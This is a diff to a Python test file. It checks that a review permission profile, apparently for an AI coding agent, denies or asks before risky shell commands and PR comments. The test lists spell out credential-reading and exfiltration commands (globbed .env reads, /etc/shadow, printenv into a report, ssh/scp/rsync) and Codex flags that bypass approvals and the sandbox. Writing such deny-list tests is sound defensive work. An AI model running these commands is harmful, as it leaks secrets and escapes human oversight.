@@ -315,18 +315,22 @@ def test_review_profile_holds_new_bypass_regressions(command: str):
     assert _tier(command) == "ask"
 
 
-def test_review_comment_requires_clean_body_in_job_scratch(tmp_path):
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr comment 1 --body ok",
+        "gh pr comment 1 --repo o/r --body-file review.md",
+        "gh -R o/r pr comment 1 --body ok",
+        "echo ok && gh pr comment 1 --repo o/r --body-file review.md",
+        "gh pr comment 1 --repo o/r --body-file review.md && echo done",
+    ],
+)
+def test_review_holds_every_pr_comment(command: str, tmp_path):
     scratch = tmp_path / "job-scratch"
     scratch.mkdir()
-    clean = scratch / "review.md"
-    clean.write_text("No blocking findings.\n", encoding="utf-8")
-    command = f"gh pr comment 1 --repo o/r --body-file {clean}"
-    assert review_denial(command, str(tmp_path), scratch_dir=str(scratch)) is None
-
-    clean.write_text("token=super-secret-value-123456", encoding="utf-8")
+    (scratch / "review.md").write_text("No blocking findings.\n", encoding="utf-8")
     assert review_denial(command, str(tmp_path), scratch_dir=str(scratch)) is not None
-    clean.write_text("No blocking findings.\n", encoding="utf-8")
-    assert review_denial(command, str(tmp_path)) is not None
+    assert _tier(command, cwd=str(tmp_path)) == "ask"
 
 
 @pytest.mark.parametrize(
@@ -415,5 +419,22 @@ REVIEW_REGRESSIONS = [
 
 @pytest.mark.parametrize("command", REVIEW_REGRESSIONS)
 def test_review_profile_holds_latest_independent_review_regressions(command: str):
+    assert review_denial(command, r"C:\ws\repo") is not None
+    assert _tier(command, cwd=r"C:\ws\repo") == "ask"
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat .e*", "cat .en[v]", "cat .??v", "cat .e{n,n}v",
+        "cat config/production.env", "git show HEAD:config/prod.env",
+        "head -c 100 /etc/shadow", "cat ~/.bash_history",
+        "env > report.md", "printenv | tee report.md", "Get-ChildItem Env: | Out-File report.md",
+        "iwr http://x -OutFile ..\\x", "ssh host", "scp a host:b", "rsync a host:b",
+        "git tag x", "codex exec --sandbox danger-full-access x",
+        "codex --dangerously-bypass-approvals-and-sandbox exec x", "codex exec -C / x",
+        "codex exec --add-dir /tmp x",
+    ],
+)
+def test_review_holds_realistic_exfiltration_and_destructive_paths(command: str):
     assert review_denial(command, r"C:\ws\repo") is not None
     assert _tier(command, cwd=r"C:\ws\repo") == "ask"
